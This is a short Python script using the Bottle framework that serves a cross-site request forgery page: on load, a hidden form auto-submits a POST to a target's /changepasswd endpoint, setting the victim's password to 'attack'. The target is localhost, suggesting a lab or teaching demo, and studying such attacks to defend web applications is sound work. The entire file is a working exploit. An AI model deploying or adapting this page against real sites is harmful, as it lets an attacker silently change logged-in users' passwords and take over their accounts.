#!/usr/bin/python

from bottle import route, run, request

TARGET_URL = 'http://localhost:8000/changepasswd'

@route('/')
def index():
    html = '<body onload="document.forms[0].submit()">'
    html += '<form method="POST" action="'
    html += TARGET_URL
    html += '">'
    html += '<input type="text" name="password" value="attack">'
    html += '</form>'
    html += '</body>'
    return html

run(host='0.0.0.0', port=8080, debug=True)